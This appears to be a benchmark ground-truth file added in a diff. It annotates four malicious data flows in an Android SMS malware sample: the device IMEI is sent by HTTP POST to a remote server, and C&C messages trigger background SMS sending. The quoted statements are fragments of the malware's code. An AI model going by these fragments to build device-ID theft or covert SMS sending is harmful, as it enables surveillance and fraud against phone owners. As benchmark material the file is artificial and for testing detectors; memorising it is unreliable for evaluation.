@@ -1,0 +1,238 @@
+{
+  "fileName": "sms_google.apk",
+  "day": "2019-05-09",
+  "findings": [
+    {
+      "source": {
+        "statement": "info.put(\"imei\", utils.getDeviceId());",
+        "methodName": "public void onCreate()",
+        "className": "com.google.elements.WorkService",
+        "lineNo": 34,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r4.<com.google.elements.Utils: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "return EntityUtils.toString(client.execute(post).getEntity());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.google.elements.Utils.sendPostRequest",
+        "lineNo": 716,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "utils.sendPostRequest(\"registration\", info.toString());",
+          "methodName": "public void onCreate()",
+          "className": "com.google.elements.WorkService",
+          "lineNo": 45,
+          "ID": 1
+        },
+        {
+          "statement": "new sendPostRequest(this, null).execute(new String[]{getUrl() + url, data});",
+          "methodName": "public void sendPostRequest(String url, String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 650,
+          "ID": 2
+        },
+        {
+          "statement": "post.setEntity(new StringEntity(params[1], \"UTF-8\"));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.elements.Utils.sendPostRequest",
+          "lineNo": 712,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads the device id and puts it into a JSON object which will be sent to a remote sever via HTTP request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "info.put(\"imei\", utils.getDeviceId());",
+        "methodName": "public void run()",
+        "className": "com.google.elements.WorkService.AnonymousClass1",
+        "lineNo": 56,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<com.google.elements.Utils: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "return EntityUtils.toString(client.execute(post).getEntity());",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.google.elements.Utils.sendPostRequest",
+        "lineNo": 716,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "utils.sendPostRequest(\"repeat\", info.toString());",
+          "methodName": "public void run()",
+          "className": "com.google.elements.WorkService.AnonymousClass1",
+          "lineNo": 61,
+          "ID": 1
+        },
+        {
+          "statement": "new sendPostRequest(this, null).execute(new String[]{getUrl() + url, data});",
+          "methodName": "public void sendPostRequest(String url, String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 650,
+          "ID": 2
+        },
+        {
+          "statement": "post.setEntity(new StringEntity(params[1], \"UTF-8\"));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.google.elements.Utils.sendPostRequest",
+          "lineNo": 712,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads the device id and puts it into a JSON object which will be sent to a remote sever via HTTP request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "utils.sendBackgroundMessage(intent.getStringExtra(\"data\"));",
+        "methodName": "public void onMessage(Context context, Intent intent)",
+        "className": "com.google.elements.GCMIntentService",
+        "lineNo": 55,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"data\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);",
+        "methodName": "public void run()",
+        "className": "com.google.elements.Utils.AnonymousClass1",
+        "lineNo": 538,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r1, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "JSONObject json = new JSONObject(data);",
+          "methodName": "public void sendBackgroundMessage(String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 528,
+          "ID": 1
+        },
+        {
+          "statement": "final String text = json.getString(\"text\").replace(\"%id\", getPartnerId());",
+          "methodName": "public void sendBackgroundMessage(String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 531,
+          "ID": 2
+        },
+        {
+          "statement": "public void run() {",
+          "methodName": "public void sendBackgroundMessage(String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 536,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "nonStaticField": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious partial flow listens to C&C command and sends SMS message in the background.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "utils.sendMessageNow(intent.getStringExtra(\"data\"));",
+        "methodName": "public void onMessage(Context context, Intent intent)",
+        "className": "com.google.elements.GCMIntentService",
+        "lineNo": 57,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"data\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "SmsManager.getDefault().sendTextMessage(json.getString(\"phone\"), null, json.getString(\"text\").replace(\"%id\", getPartnerId()), null, null);",
+        "methodName": "public void sendMessageNow(String data)",
+        "className": "com.google.elements.Utils",
+        "lineNo": 553,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r1, null, $r4, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "JSONObject json = new JSONObject(data);",
+          "methodName": "public void sendMessageNow(String data)",
+          "className": "com.google.elements.Utils",
+          "lineNo": 548,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "partialFlow": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious partical flow listens to C&C command and sends SMS message.",
+      "isNegative": false
+    }
+  ]
+}
